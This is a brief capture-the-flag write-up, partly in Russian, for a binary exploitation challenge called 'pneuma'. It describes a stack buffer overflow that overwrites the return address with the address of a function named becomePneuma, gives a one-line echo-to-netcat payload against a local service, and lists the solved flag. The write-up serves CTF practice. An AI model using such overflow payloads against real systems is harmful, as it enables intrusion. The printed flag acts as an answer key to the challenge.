# pwn | pneuma

## Information
We are spirit bound to this flesh
We go round one foot nailed down
But bound to reach out and beyond this flesh
Become Pneuma

## Writeup

Переполняем буфер, перетираем адрес возврата адресом функции becomePneuma. Profit!

`echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaRBPRBPRB\xFD\x12\x40\x00\x00\x00\x00\x00" | nc localhost 9003`

## Flag
`SgffCTF{3y3s_fu11_0f_w0nd3r}`
